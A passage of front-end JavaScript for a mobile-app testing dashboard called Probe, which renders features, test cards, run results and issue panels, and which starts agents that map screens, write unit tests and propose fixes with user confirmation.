secondary" id="verifyf" data-job="${esc(jobKey.verifyFeatures([f.id]))}" data-busy="Verifying\u2026" title="Unit tests, then this feature\'s approved cards on a device">\u2713 Verify</button>\n      <button class="btn" id="run" data-job="${esc(jobKey.unit(f.id))}" data-busy="Running\u2026" ${withTests ? "" : "disabled"}>\u25B6 Run unit tests</button></div>\n    <div id="knowledge"></div>\n    ${h ? `<div class="box"><h3>Health ${healthPill(h)}</h3>${h.reasons.length ? `<ul>${h.reasons.map((r) => `<li>${esc(r)}</li>`).join("")}</ul>` : `<span class="muted">Every check Probe has run passed.</span>`}</div>` : ""}\n    <div class="cards">\n      <div class="card"><div class="k">Modules</div><div class="v">${s.modules}</div></div>\n      <div class="card"><div class="k">Testable classes</div><div class="v">${s.testable}</div></div>\n      <div class="card"><div class="k">Test class</div><div class="v" style="color:var(--ok)">${s.direct}</div></div>\n      <div class="card"><div class="k">Referenced</div><div class="v" style="color:var(--warn)">${s.referenced}</div></div>\n      <div class="card"><div class="k">Untested</div><div class="v" style="color:var(--fail)">${s.untested}</div></div>\n    </div>\n    <div id="runpanel"></div>\n    <h2>Cards</h2>\n    <div id="featurecards"></div>\n    <h2>Screens ${nav ? `<span class="muted" style="font-weight:400">\xB7 mapped ${ago(nav.at)}</span>` : ""}</h2>\n    ${nav ? `${nav.issues.length ? `<div class="box" style="border-color:var(--fail)"><h3>Navigation issues</h3><ul>${nav.issues.map((i) => `<li>${esc(i)}</li>`).join("")}</ul></div>` : ""}\n      <table><thead><tr><th>Screen</th><th>How to reach it</th><th class="hide-sm">Notes</th></tr></thead><tbody>\n      ${nav.screens.map((sc) => `<tr><td><strong>${esc(sc.name)}</strong>${sc.screenshot ? ` <a class="muted" target="_blank" href="/api/runs/${encodeURIComponent(nav.runId)}/files/${esc(sc.screenshot)}">screenshot</a>` : ""}</td><td><div class="reach">${sc.reach.map((r) => `<span>${esc(r)}</span>`).join("<b>\u2192</b>")}</div></td><td class="muted hide-sm">${esc(sc.notes)}</td></tr>`).join("")}\n      </tbody></table>` : `<div class="empty card">Not mapped yet. <strong>\u2316 Map screens</strong> lets an agent walk this feature on an emulator.</div>`}\n    <h2>Riskiest untested classes</h2>\n    <p class="muted" style="margin-top:-4px">Ranked by kind (reducer, use case, view model\u2026) and size. Static analysis: a class counts as tested when a test class is named after it.</p>\n    <table>\n      <thead><tr><th>Class</th><th>Kind</th><th class="num">Lines</th><th class="num">Risk</th><th class="hide-sm">File</th></tr></thead>\n      <tbody>${f.gaps.map((c) => `<tr><td><strong>${esc(c.name)}</strong></td><td>${c.kind}</td><td class="num">${c.lines}</td><td class="num">${c.risk}</td><td class="mono muted hide-sm">${esc(c.file)}</td></tr>`).join("") || `<tr><td colspan="5" class="empty">No untested classes worth testing \u{1F389}</td></tr>`}</tbody>\n    </table>\n    <h2>Modules</h2>\n    <table>\n      <thead><tr><th>Module</th><th>Platform</th><th class="num">Source files</th><th class="num">Unit test files</th><th class="num hide-sm">Instrumented</th><th class="hide-sm">Unit task</th></tr></thead>\n      <tbody>${f.modules.map((m) => `<tr><td class="mono">${esc(m.id)}</td><td>${m.platform}</td><td class="num">${m.mainFiles}</td><td class="num">${m.testFiles}</td><td class="num hide-sm">${m.instrumentedTestFiles}</td><td class="mono muted hide-sm">${esc(m.unitTestTask || "\u2014")}</td></tr>`).join("")}</tbody>\n    </table>`;\n  document.getElementById("back").addEventListener("click", () => { state.feature = null; render(); });\n  renderKnowledge(f.id);\n  const showCards = async () => {\n    const cards = (await api("/api/cards")).filter((c) => c.feature === f.id);\n    const el = document.getElementById("featurecards");\n    if (!el) return;\n    el.innerHTML = cards.length ? cards.map(cardHtml).join("") : `<div class="empty card">No cards yet. <strong>\u2726 Draft cards</strong> lets an agent write them from code, docs and git history.</div>`;\n    bindCardActions(el, showCards);\n    showJobs();\n  };\n  showCards();\n  document.getElementById("backfill").addEventListener("click", async (e) => {\n    e.target.disabled = true; e.target.textContent = "Agent drafting\u2026";\n    const res = await api("/api/cards/" + encodeURIComponent(f.id) + "/backfill", { method: "POST" });\n    if (res.error) { alert(res.error); e.target.disabled = false; e.target.textContent = "\u2726 Draft cards"; return; }\n    followRun(res.runId, document.getElementById("runpanel"), () => { e.target.disabled = false; e.target.textContent = "\u2726 Draft cards"; state.scan = null; showCards(); });\n  });\n  document.getElementById("run").addEventListener("click", async (e) => {\n    e.target.disabled = true; e.target.textContent = "Running\u2026";\n    const res = await post("/api/unit/" + encodeURIComponent(f.id));\n    if (res.error) { alert(res.error); e.target.disabled = false; e.target.textContent = "\u25B6 Run unit tests"; return; }\n    followRun(res.runId,document.getElementById("runpanel"), () => { e.target.disabled = false; e.target.textContent = "\u25B6 Run unit tests"; state.scan = null; });\n  });\n  const start = (btnId, busy, path, body, after) => document.getElementById(btnId).addEventListener("click", async (e) => {\n    const label = e.target.textContent;\n    e.target.disabled = true; e.target.textContent = busy;\n    const res = await post(path, body);\n    if (res.error) { alert(res.error); e.target.disabled = false; e.target.textContent = label; return; }\n    followRun(res.runId, document.getElementById("runpanel"), () => { e.target.disabled = false; e.target.textContent = label; state.scan = null; after && after(); });\n  });\n  start("explore", "Agent mapping\u2026", "/api/explore/" + encodeURIComponent(f.id), {}, () => renderFeature(f.id));\n  start("unitwrite", "Agent writing tests\u2026", "/api/unitwrite/" + encodeURIComponent(f.id), {});\n  start("verifyf", "Verifying\u2026", "/api/verify", { features: [f.id] }, showCards);\n}\n\n// Every action carries the branch the person is looking at; the server refuses it if the\n// project has moved to another branch since (a checkout in a terminal or the IDE).\nconst post = async (path, body) => {\n  const headers = { "content-type": "application/json" };\n  if (state.branchSeen) headers["x-probe-branch"] = encodeURIComponent(state.branchSeen);\n  const res = await api(path, { method: "POST", headers, body: JSON.stringify(body || {}) });\n  if (res.branchChanged) checkBranch();\n  return res;\n};\n\nasync function checkBranch() {\n  const b = await api("/api/branch").catch(() => null);\n  if (!b) return;\n  state.branchInfo = b;\n  if (b.id && !state.branchSeen) state.branchSeen = b.id;\n  const chip = document.getElementById("branch");\n  chip.textContent = b.git ? `\u2387 ${b.id}${b.git.dirty ? ` \xB7 ${b.git.dirty} uncommitted` : ""}` : "no git";\n  chip.className = "branch" + (b.warnings.length ? " warn" : "");\n  chip.title = ["Branch this project is on" + (b.base ? `; verify compares with ${b.base}` : ""), ...b.warnings].join("\\n");\n  const banner = document.getElementById("banner");\n  if (b.id && state.branchSeen && b.id !== state.branchSeen) {\n    banner.innerHTML = `<div class="banner"><strong>The branch changed: ${esc(state.branchSeen)} \u2192 ${esc(b.id)}.</strong>\n      <span>Actions are paused so nothing runs on code you did not mean to test.</span>\n      <button class="btn" id="bok">Continue on ${esc(b.id)}</button></div>`;\n    document.getElementById("bok").addEventListener("click", () => { state.branchSeen = b.id; state.scan = null; banner.innerHTML = ""; checkBranch(); render(); });\n  } else if (!b.git || b.warnings.some((w) => /base branch itself|Detached/.test(w))) {\n    banner.innerHTML = `<div class="banner warn">${b.warnings.map(esc).join(" \xB7 ")}</div>`;\n  } else banner.innerHTML = "";\n}\nsetInterval(checkBranch, 5000);\n\nfunction followRun(runId, el, onDone) {\n  closeStream();\n  el.innerHTML = `<h2>Run ${esc(runId)} <span class="pill running" id="rs">running</span> <button class="btn stop" id="rstop" title="Kills its build or agent; the run ends as stopped and does not count toward health">\u25A0 Stop</button></h2><div id="rr"></div><pre class="log" id="log"></pre>`;\n  const log = el.querySelector("#log");\n  const stopBtn = el.querySelector("#rstop");\n  stopBtn.addEventListener("click", async () => {\n    if (!confirm(`Stop run ${runId}?`)) return;\n    stopBtn.disabled = true; stopBtn.textContent = "Stopping\u2026";\n    const res = await stopRunReq(runId);\n    if (res.error) { alert(res.error); stopBtn.remove(); }\n  });\n  const es = new EventSource(`/api/runs/${runId}/stream`);\n  state.eventSource = es;\n  es.onmessage = (msg) => {\n    const e = JSON.parse(msg.data);\n    if (e.type === "log") {\n      const atBottom = log.scrollTop + log.clientHeight >= log.scrollHeight - 20;\n      log.textContent += e.line + "\\n";\n      if (atBottom) log.scrollTop = log.scrollHeight;\n    } else if (e.type === "done") {\n      es.close(); state.eventSource = null;\n      const rs = el.querySelector("#rs"); rs.className = "pill " + e.run.status; rs.textContent = e.run.status;\n      el.querySelector("#rstop")?.remove();\n      const rr = el.querySelector("#rr");\n      rr.innerHTML = resultsTable(e.run) + `<div id="ri"></div>`;\n      bindTicket(rr);\n      renderIssues(e.run, rr.querySelector("#ri"), el);\n      rr.querySelectorAll("a[data-open]").forEach((a) => a.addEventListener("click", (ev) => { ev.preventDefault(); state.tab === "runs" ? selectRun(a.dataset.open) : followRun(a.dataset.open, el); }));\n      // Over at once here, not at the next poll, so a re-render does not mark its button busy again.\n      state.jobs = state.jobs.filter((j) => j.runId !== e.run.id);\n      onDone && onDone(e.run);\n      showJobs();\n    }\n  };\n  es.onerror = () => { es.close(); state.eventSource = null; };\n}\n\nconst ISSUE_KIND = { test: "failing test", build: "build", card: "card failed", expectation: "not as expected", crash: "crash", perf: "performance", navigation: "navigation" };\n\n/** Problems a run found, each with the two ways to fix it: a prompt to paste anywhere, or a fix agent here. */\nasync function renderIssues(run, el, panel) {\n  if (run.status === "running" || run.kind === "fix") return;\n  const issues = await api(`/api/runs/${encodeURIComponent(run.id)}/issues`).catch(() => []);\n  if (!Array.isArray(issues) || !issues.length) return;\n  el.innerHTML = `<div class="box issues" style="border-color:var(--fail)"><h3>${issues.length} problem${issues.length === 1 ? "" : "s"} to fix</h3>\n    ${issues.map((i) => `<div class="issue" data-issue="${esc(i.id)}">\n      <div class="what"><span class="pill none k">${esc(ISSUE_KIND[i.kind] || i.kind)}</span> <strong>${esc(i.title)}</strong><div class="muted" style="font-size:12px">${esc(i.feature)}${i.cardId ? ` / ${esc(i.cardId)}` : ""}${i.runId !== run.id ? ` \xB7 run ${esc(i.runId)}` : ""}</div></div>\n      <button class="btn secondary" data-prompt title="A prompt with the problem, its evidence and the code to look at, for any coding agent">\u29C9 Fix prompt</button>\n      <button class="btn" data-fix title="An agent edits the code to fix it, then Probe runs the unit tests and the card again. Nothing is committed.">\u2726 Fix</button>\n      <div class="ip" style="flex:1 1 100%"></div></div>`).join("")}</div>`;\n  el.querySelectorAll(".issue").forEach((row) => {\n    const id = row.dataset.issue;\n    const out = row.querySelector(".ip");\n    row.querySelector("[data-prompt]").addEventListener("click", async () => {\n      if (out.innerHTML) { out.innerHTML = ""; return; }\n      const r = await api(`/api/issues/${encodeURIComponent(id)}/prompt`);\n      out.innerHTML = `<textarea class="prompt" readonly>${esc(r.prompt)}</textarea><div class="row"><button class="btn secondary" data-copy>Copy</button><span class="muted" data-copied></span></div>`;\n      out.querySelector("[data-copy]").addEventListener("click", async () => {\n        const ta = out.querySelector("textarea");\n        try { await navigator.clipboard.writeText(ta.value); } catch { ta.select(); document.execCommand("copy"); }\n        out.querySelector("[data-copied]").textContent = "Copied.";\n      });\n    });\n    row.querySelector("[data-fix]").addEventListener("click", async () => {\n      const branch = state.branchSeen ? ` on ${state.branchSeen}` : "";\n      if (!confirm(`An agent will change the code${branch} to fix:\\n\\n${row.querySelector("strong").textContent}\\n\\nThen Probe runs the unit tests (and the card again). Nothing is committed: you review the changes. Start?`)) return;\n      const res = await post(`/api/issues/${encodeURIComponent(id)}/fix`);\n      if (res.error) return alert(res.error);\n      followRun(res.runId, panel);\n    });\n  });\n}\n\nconst stopRunReq = (id) => post(`/api/runs/${encodeURIComponent(id)}/stop`);\n\nfunction perfBlock(p) {\n  if (!p) return "";\n  const cell = (k, v) => `<div class="card"><div class="k">${k}</div><div class="v" style="font-size:17px">${v}</div></div>`;\n  return `<div class="cards" style="margin:8px 0">${p.startupMs !== undefined ? cell("Cold start", p.startupMs + " ms") : ""}${cell("Frames", p.frames)}${cell("Janky", p.jankyPct + "%")}${cell("p50 / p90 / p99", `${p.p50Ms} / ${p.p90Ms} / ${p.p99Ms} ms`)}${p.memoryMb ? cell("Memory", p.memoryMb + " MB") : ""}</div>` +\n    p.issues.map((i) => `<p style="color:var(--warn)">\u26A0 ${esc(i)}</p>`).join("");\n}\n\nfunction evidence(run) {\n  const file = (name) => `/api/runs/${encodeURIComponent(run.id)}/files/${name}`;\n  const shots = run.timeline.filter((t) => t.screenshot);\n  return `<p>${esc(run.device)} \xB7 ${run.timeline.length} steps \xB7 $${run.costUsd.toFixed(2)}</p>` + perfBlock(run.perf) +\n    run.crashes.map((c) => `<pre class="log" style="color:var(--fail)">${esc(c)}</pre>`).join("") +\n    (run.video ? `<video controls preload="metadata" src="${file(run.video)}" style="max-height:420px;max-width:100%;border-radius:10px;margin:8px 0"></video>` : "") +\n    (shots.length ? `<div class="shots">${shots.map((t, i) => `<figure><a href="${file(t.screenshot)}" target="_blank"><img loading="lazy" src="${file(t.screenshot)}" alt="step ${i + 1}"></a><figcaption>${esc(t.action)} \xB7 ${esc(t.detail).slice(0, 80)}</figcaption></figure>`).join("")}</div>` : "") +\n    `<details style="margin-top:8px"><summary class="muted">All ${run.timeline.length} steps</summary><ol class="mono">${run.timeline.map((t) => `<li>${esc(t.action)} \u2014 ${esc(t.detail)}</li>`).join("")}</ol></details>`;\n}\n\nfunction ticketButton(run) {\n  if (run.status === "passed" || run.status === "running" || run.status === "stopped" || run.kind === "backfill" || run.kind === "login" || run.kind === "init") return "";\n  return `<div class="row" style="margin:10px 0"><button class="btn secondary" data-ticket="${esc(run.id)}">\u29C9 Ticket draft</button></div><div class="ticketpanel"></div>`;\n}\n\nasync function bindTicket(el) {\n  const b = el.querySelector("button[data-ticket]");\n  if (!b) return;\n  b.addEventListener("click", async () => {\n    const [d, cfg] = await Promise.all([api(`/api/runs/${encodeURIComponent(b.dataset.ticket)}/ticket`), api("/api/tickets/config")]);\n    const panel = el.querySelector(".ticketpanel");\n    panel.innerHTML = `<div class="box"><h3>${esc(d.title)}</h3><textarea class="mono" readonly style="min-height:220px">${esc(d.body)}</textarea>\n      <div class="row" style="margin-top:8px"><button class="btn secondary" data-copy>Copy</button>${cfg.canFile ? `<button class="btn" data-file>File ticket</button>` : `<span class="muted">Set tickets.fileCommand in probe.yaml to file from here.</span>`}<span class="muted" data-out></span></div></div>`;\n    panel.querySelector("[data-copy]").addEventListener("click", () => navigator.clipboard.writeText(`${d.title}\\n\\n${d.body}`).then(() => (panel.querySelector("[data-out]").textContent = "Copied.")));\n    const file = panel.querySelector("[data-file]");\n    if (file) file.addEventListener("click", async () => {\n      if (!confirm(`File "${d.title}" with the configured ticket command?`)) return;\n      file.disabled = true;\n      const res = await post(`/api/runs/${encodeURIComponent(b.dataset.ticket)}/ticket/file`);\n      panel.querySelector("[data-out]").textContent = res.error ? res.error : `Filed: ${res.output}`;\n    });\n  });\n}\n\nfunction resultsTable(run) {\n  const err = run.error ? `<p style="color:var(--fail)">${esc(run.error)}</p>` : "";\n  if (run.kind === "verify") {\n    const link = (id, label) => id ? `<a href="#" data-open="${esc(id)}">${esc(label)}</a>` : esc(label);\n    return err + `<p>vs <strong>${esc(run.base)}</strong> \xB7 ${run.changed.length} changed files \xB7 ${run.features.length} features \xB7 ${run.device ? "unit + device" : "unit only"} \xB7 $${run.costUsd.toFixed(2)}</p>\n      <table style="margin:8px 0"><thead><tr><th>Feature</th><th>Unit</th><th>Cards on device</th></tr></thead><tbody>\n      ${run.features.map((f) => `<tr><td><strong>${esc(f.feature)}</strong><br><span class="muted">${f.files.length} files</span></td>\n        <td>${f.unitStatus ? `<span class="pill ${f.unitStatus}">${link(f.unitRun, f.unitStatus)}</span>` : "\u2014"}</td>\n        <td>${f.cards.map((c) => `<div><span class="pill ${c.status}">${c.status}</span> ${link(c.runId, c.cardId)}${c.note ? ` <span class="muted">\u2014 ${esc(c.note)}</span>` : ""}</div>`).join("") || "\u2014"}</td></tr>`).join("")}\n      </tbody></table>\n      ${run.unowned.length ? `<details><summary class="muted">${run.unowned.length} changed files outside any module</summary><p class="mono muted">${run.unowned.map(esc).join("<br>")}</p></details>` : ""}` + ticketButton(run);\n  }\n  if (run.kind === "init") {\n    return err + `<p>${run.drafts.length ? `${run.drafts.length} drafts to review below` : "no new drafts"}${run.costUsd ? ` \xB7 ${run.costUsd.toFixed(2)}` : ""}</p>`;\n  }\n  if (run.kind === "login") {\n    const l = run.login;\n    return err + (l ? `<p><strong>${l.state === "logged_in" ? (l.role ? `Logged in as ${esc(l.role)}` : "Logged in with a NON-test account") : l.state === "logged_out" ? "Logged out" : "Unknown"}</strong>${l.seenAs ? ` \xB7 shows ${esc(l.seenAs)}` : ""}</p>${l.notes ? `<p class="muted">${esc(l.notes)}</p>` : ""}` : "") + evidence(run);\n  }\n  if (run.kind === "explore") {\n    return err + `${run.issues.length ? `<div class="box" style="border-color:var(--fail)"><h3>Issues</h3><ul>${run.issues.map((i) => `<li>${esc(i)}</li>`).join("")}</ul></div>` : ""}\n      <table style="margin:8px 0"><thead><tr><th>Screen</th><th>Reach</th></tr></thead><tbody>${run.screens.map((sc) => `<tr><td>${esc(sc.name)}</td><td>${sc.reach.map(esc).join(" \u2192 ")}</td></tr>`).join("")}</tbody></table>` + evidence(run) + ticketButton(run);\n  }\n  if (run.kind === "unitwrite") {\n    return err + `<p>Targets: ${run.targets.map(esc).join(", ")} \xB7 $${run.costUsd.toFixed(2)}${run.unitRun ? ` \xB7 <a href="#" data-open="${esc(run.unitRun)}">unit run</a>` : ""}</p>\n      <ul class="mono">${run.files.map((f) => `<li style="${run.outsideTests.includes(f) ? "color:var(--warn)" : ""}">${run.outsideTests.includes(f) ? "\u26A0 " : "+ "}${esc(f)}</li>`).join("")}</ul>\n      <p class="muted">Nothing is committed: review the files in your working tree.</p>`;\n  }\n  if (run.kind === "card") {\n    const v = run.verdict;\n    const exp = v ? `<table style="margin:8px 0"><tbody>${v.expectations.map((e) => `<tr><td>${e.met === true ? "\u2705" : e.met === false ? "\u274C" : "\u2754"}</td><td>${esc(e.text)}<br><span class="muted">${esc(e.evidence)}</span></td></tr>`).join("")}</tbody></table>` : "";\n    return err + `<p class="muted">${esc(run.feature)} / ${esc(run.cardId)}${run.parent ? ` \xB7 part of <a href="#" data-open="${esc(run.parent)}">verify ${esc(run.parent)}</a>` : ""}</p>` + (v?.notes ? `<p>${esc(v.notes)}</p>` : "") + exp + evidence(run) + ticketButton(run);\n  }\n  if (run.kind === "fix") {\n    const link = (id, label) => id ? ` \xB7 <a href="#" data-open="${esc(id)}">${label}</a>` : "";\n    return err + `<p><strong>${esc(run.issue.title)}</strong></p>\n      <p class="muted">${esc(run.feature)} \xB7 $${run.costUsd.toFixed(2)}${link(run.issue.runId, "where it was found")}${link(run.unitRun, "unit run")}${link(run.recheckRun, "device recheck")}</p>\n      ${run.files.length ? `<ul class="mono">${run.files.map((f) => `<li>~ ${esc(f)}</li>`).join("")}</ul><p class="muted">Nothing is committed: review the changes in your working tree.</p>` : ""}\n      ${run.summary ? `<details open><summary class="muted">Agent\'s account</summary><pre class="log" style="background:var(--track);color:var(--text)">${esc(run.summary)}</pre></details>` : ""}`;\n  }\n  if (run.kind === "check") {\n    const link = (id, label) => id ? `<a href="#" data-open="${esc(id)}">${esc(label)}</a>` : esc(label);\n    const features = run.features || [];\n    return err + `<p class="muted">After ${esc(TRIGGER[run.trigger] || run.trigger)} edits \xB7 ${features.length} feature${features.length === 1 ? "" : "s"} checked</p>\n      ${features.length ? `<table style="margin:8px 0"><thead><tr><th>Feature</th><th>Unit</th><th>Manifest</th></tr></thead><tbody>\n      ${features.map((f) => `<tr><td><strong>${esc(f.feature)}</strong>${f.owned ? "" : `<br><span class="muted">depends on the change</span>`}${f.note ? `<br><span class="muted">${esc(f.note)}</span>` : ""}</td>\n        <td>${f.unitStatus ? `<span class="pill ${f.unitStatus}">${link(f.unitRun, f.unitStatus)}</span>` : "\u2014"}\n          ${(f.failures || []).map((x) => `<div class="mono" style="color:var(--fail);font-size:12px;margin-top:4px">\u2717 ${esc(x)}</div>`).join("")}\n          ${(f.deviceRules || []).length ? `<div class="muted" style="font-size:12px;margin-top:4px">Only a device proves: ${f.deviceRules.map(esc).join(", ")}</div>` : ""}</td>\n        <td>${f.manifest ? `${f.manifest.links} links${f.manifest.broken ? ` \xB7 <strong style="color:var(--fail)">${f.manifest.broken} broken</strong>` : ""}${f.manifest.gaps ? ` \xB7 ${f.manifest.gaps} unproven` : ""}` : "\u2014"}\n          ${f.draftId ? `<div style="font-size:12px;margin-top:4px">\u270E correction drafted \xB7 <a href="#setup">review in Setup</a></div>` : ""}</td></tr>`).join("")}\n      </tbody></table>` : `<p>Nothing was stale.</p>`}\n      ${(run.skipped || []).length ? `<details><summary class="muted">${run.skipped.length} left for a later check</summary><p class="mono muted">${run.skipped.map(esc).join(", ")}</p></details>` : ""}`;\n  }\n  if (run.kind === "backfill") {\n    return err + `<p>${run.written.length} cards written \xB7 $${run.costUsd.toFixed(2)}</p>` +\n      (run.written.length ? `<p class="mono muted">${run.written.map(esc).join(" \xB7 ")}</p>` : "");\n  }\n  // Unit runs, and anything this page does not know yet: never let a missing field blank the panel.\n  const results = run.results || [];\n  if (!results.length) return err;\n  return err + ticketButton(run) + `<table style="margin-bottom:12px"><thead><tr><th>Module</th><th class="num">Tests</th><th class="num">Failed</th><th class="num">Skipped</th><th class="num">Time</th></tr></thead><tbody>\n    ${results.map((r) => `<tr><td class="mono">${esc(r.module)}${r.cached ? ` <span class="pill none" title="Code unchanged since the last build; results reused">cached</span>` : ""}</td><td class="num">${r.tests}</td><td class="num" style="${r.failed ? "color:var(--fail);font-weight:700" : ""}">${r.failed}</td><td class="num">${r.skipped}</td><td class="num">${(r.durationMs / 1000).toFixed(1)}s</td></tr>\n      ${r.failures.map((x) => `<tr><td colspan="5" class="mono" style="color:var(--fail)">\u2717 ${esc(x.className)}.${esc(x.name)}<br><span class="muted">${esc(x.message || "")}</span></td></tr>`).join("")}`).join("")}\n  </tbody></table>`;\n}\n\nconst LEVEL_LABEL = { feature: "overview", capability: "flow", regression: "regression" };\n\nfunction cardHtml(c) {\n  const list = (items) => items.map((x) => `<li>${esc(x)}</li>`).join("");\n  return `<details class="fc" data-feature="${esc(c.feature)}" data-id="${esc(c.id)}">\n    <summary>\n      <span class="pill lvl-${c.level}">${LEVEL_LABEL[c.level]}</span>\n      <strong>${esc(c.title)}</strong>\n      ${c.tickets.map((t) => `<span class="mono muted">${esc(t)}</span>`).join(" ")}\n      <span style="flex:1"></span>\n      ${lastRunPill(c.lastRun)}\n      <span class="pill conf-${c.confidence}" title="confidence">${c.confidence}</span>\n      <span class="pill st-${c.status}">${c.status}</span>\n    </summary>\n    <div class="fc-body">\n      <p>${esc(c.summary)}</p>\n      <div class="reach">${c.reach.map((r) => `<span>${esc(r)}</span>`).join("<b>\u2192</b>")}</div>\n      ${c.preconditions.length ? `<div class="k">Given</div><ul>${list(c.preconditions)}</ul>` : ""}\n      <div class="k">Steps</div><ol>${list(c.steps)}</ol>\n      <div class="k">Expect</div><ul class="expect">${c.expect.map((e) => `<li><span class="pill none">${e.check}</span> ${esc(e.text)}</li>`).join("")}</ul>\n      <div class="k">Sources</div><ul class="mono muted">${c.sources.map((s) => `<li>${s.type}: ${esc(s.ref)}${s.note ? ` \u2014 ${esc(s.note)}` : ""}</li>`).join("")}</ul>\n      <div class="muted" style="font-size:12px">${c.accounts} test account${c.accounts === 1 ? "" : "s"} \xB7 ${esc(c.modules.join(", "))} \xB7 ${c.createdBy}, ${ago(c.updatedAt)}</div>\n      <div class="row" style="margin-top:10px">\n        <button class="btn" data-run data-job="${esc(jobKey.card(c.feature, c.id))}" data-busy="Agent testing\u2026" ${noDevices() ? `disabled title="${esc(noDevices())}"` : `title="An agent performs this card on an emulator and checks every expectation"`}>\u25B6 Run on device</button>\n        ${c.status !== "approved" ? `<button class="btn secondary" data-status="approved">Approve</button>` : ""}\n        ${c.status !== "rejected" ? `<button class="btn secondary" data-status="rejected">Reject</button>` : ""}\n        ${c.status !== "draft" ? `<button class="btn secondary" data-status="draft">Back to draft</button>` : ""}\n      </div>\n    </div>\n  </details>`;\n}\n\nfunction bindCardActions(el, refresh) {\n  el.querySelectorAll("details.fc").forEach((d) => d.querySelectorAll("button[data-run]").forEach((b) => b.addEventListener("click", async () => {\n    b.disabled = true; b.textContent = "Agent testing\u2026";\n    const res = await api(`/api/cards/${encodeURIComponent(d.dataset.feature)}/${encodeURIComponent(d.dataset.id)}/run`, { method: "POST" });\n    if (res.error) { alert(res.error); b.disabled = false; b.textContent = "\u25B6 Run on device"; return; }\n    let panel = d.querySelector(".runpanel");\n    if (!panel) { panel = document.createElement("div"); panel.className = "runpanel"; d.querySelector(".fc-body").appendChild(panel); }\n    followRun(res.runId, panel, () => { b.disabled = false; b.textContent = "\u25B6 Run on device"; });\n  })));\n  el.querySelectorAll("details.fc").forEach((d) => d.querySelectorAll("button[data-status]").forEach((b) => b.addEventListener("click", async () => {\n    await api(`/api/cards/${encodeURIComponent(d.dataset.feature)}/${encodeURIComponent(d.dataset.id)}/status`, {\n      method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ status: b.dataset.status }),\n    });\n    state.scan = null;\n    refresh();\n  })));\n}\n\nconst LEVEL_TABS = [["all", "All"], ["feature", "Overview"], ["capability", "Flows"], ["regression", "Regressions"]];\nconst SIDE_FILTERS = [["all", "All"], ["draft", "To review"], ["failing", "Failing"], ["outdated", "Outdated"], ["notrun", "Never run"]];\n\n/** One entry per feature: its counts, and the dot that says what needs attention first. */\nfunction cardFeatures(all) {\n  const by = new Map();\n  for (const c of all) {\n    const f = by.get(c.feature) || { id: c.feature, cards: [], draft: 0, approved: 0, failing: 0, notrun: 0, outdated: 0 };\n    f.cards.push(c);\n    if (c.status === "draft") f.draft++;\n    if (c.status === "approved") f.approved++;\n    if (c.lastRun && ["failed", "error"].includes(c.lastRun.status) && c.lastRun.fresh !== "stale") f.failing++;\n    if (c.lastRun && (c.lastRun.fresh === "stale" || c.lastRun.fresh === "maybe") && c.status !== "rejected") f.outdated++;\n    if (!c.lastRun && c.status !== "rejected") f.notrun++;\n    by.set(c.feature, f);\n  }\n  return [...by.values()].sort((a, b) => a.id.localeCompare(b.id));\n}\n\nasync function renderCards() {\n  if (!state.cardFilter) state.cardFilter = { side: "all", q: "", level: "all", status: "all", feature: null };\n  const fl = state.cardFilter;\n  const all = await api("/api/cards");\n  if (!all.length) {\n    $view.innerHTML = `<div class="empty">No cards yet. Open a feature in Atlas and choose \u2726 Draft cards, or <button class="btn secondary" id="bfall" data-job="${esc(jobKey.backfill("*"))}" data-busy="Agents drafting\u2026">\u2726 Draft cards for every feature</button></div><div id="runpanel"></div>`;\n    return bindBackfillAll();\n  }\n  const features = cardFeatures(all);\n  const listed = features\n    .filter((f) => !fl.q || (f.id + " " + f.cards.map((c) => c.title + " " + c.tickets.join(" ")).join(" ")).toLowerCase().includes(fl.q.toLowerCase()))\n    .filter((f) => fl.side === "all" || f[fl.side] > 0);\n  // Open on what needs a person: a failing feature, else one with drafts.\n  if (!fl.feature || !features.some((f) => f.id === fl.feature)) fl.feature = (features.find((f) => f.failing) || features.find((f) => f.draft) || features[0]).id;\n  saveRoute();\n  const f = features.find((x) => x.id === fl.feature);\n  const cards = f.cards.filter((c) => (fl.level === "all" || c.level === fl.level) && (fl.status === "all" || c.status === fl.status));\n  const total = (k) => features.reduce((n, x) => n + x[k], 0);\n  const dot = (x) => (x.failing ? "fail" : x.draft || x.outdated ? "draft" : x.approved ? "ok" : "");\n\n  $view.innerHTML = `\n    <div class="toolbar">\n      <span><strong>${all.length}</strong> cards in <strong>${features.length}</strong> features</span>\n      <span class="pill st-draft">${total("draft")} to review</span>\n      <span class="pill st-approved">${total("approved")} approved</span>\n      ${total("failing") ? `<span class="pill failed">${total("failing")} failing</span>` : ""}\n      <div style="flex:1"></div>\n      <button class="btn secondary" id="bfall" data-job="${esc(jobKey.backfill("*"))}" data-busy="Agents drafting\u2026" title="Runs a background agent per feature that has no cards yet">\u2726 Draft cards for features without any</button>\n    </div>\n    <div id="runpanel"></div>\n    <div class="split">\n      <aside class="side">\n        <div class="head">\n          <input type="search" id="cq" placeholder="Find a feature, card or ticket\u2026" value="${esc(fl.q)}">\n          <div class="chips">${SIDE_FILTERS.map(([k, label]) => `<button class="chip ${fl.side === k ? "active" : ""}" data-side="${k}">${label}${k === "all" ? "" : ` ${total(k)}`}</button>`).join("")}</div>\n        </div>\n        <ul>${listed.map((x) => `<li data-f="${esc(x.id)}" class="${x.id === f.id ? "active" : ""}" title="${x.draft} to review \xB7 ${x.approved} approved \xB7 ${x.failing} failing \xB7 ${x.notrun} never run">\n          <span class="d ${dot(x)}"></span><span class="name">${esc(x.id)}</span><span class="n">${x.draft ? `${x.draft}/` : ""}${x.cards.length}</span></li>`).join("") || `<li class="muted">No feature matches.</li>`}</ul>\n      </aside>\n      <section>\n        <div class="toolbar">\n          <h2 style="margin:0">${esc(f.id)}</h2>\n          <span class="muted">${f.cards.length} cards \xB7 ${f.approved} approved \xB7 ${f.draft} to review${f.failing ? ` \xB7 <span style="color:var(--fail)">${f.failing} failing</span>` : ""}${f.outdated ? ` \xB7 <span style="color:var(--warn)">${f.outdated} outdated</span>` : ""}</span>\n          <div style="flex:1"></div>\n          ${f.outdated || f.notrun ? `<button class="btn secondary" id="rerunold" data-job="${esc(jobKey.verifyOutdated([f.id]))}" data-busy="Re-running\u2026" title="Runs this feature\'s approved cards whose result is outdated or missing">\u27F3 Re-run ${f.outdated + f.notrun} outdated / never run</button>` : ""}\n          ${f.draft ? `<button class="btn secondary" id="approveall" title="Approve every draft card of ${esc(f.id)}">Approve all ${f.draft} drafts</button>` : ""}\n        </div>\n        <div class="toolbar">\n          <div class="seg" id="clv">${LEVEL_TABS.map(([k, label]) => `<button 